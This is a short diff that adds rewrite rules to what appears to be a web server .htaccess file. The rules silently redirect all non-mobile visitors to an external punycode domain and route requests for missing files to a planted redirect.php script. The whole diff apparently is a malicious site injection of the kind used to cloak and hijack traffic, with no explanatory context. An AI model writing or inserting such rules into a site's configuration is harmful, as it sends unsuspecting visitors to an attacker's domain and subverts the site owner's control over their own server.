@@ -1,0 +1,7 @@
+RewriteEngine Off
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} !(iPhone|iPod|Android.*Mobile|Windows.*Phone|BlackBerry)
+RewriteRule ^(.*)$ https://xn--gckgmmx3dygqimdb6gbbb4235ic1qdgxegw1a.com/$1 [R,L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !redirect\.php
+RewriteRule ^(.*)$ redirect.php?nf=$1 [L]
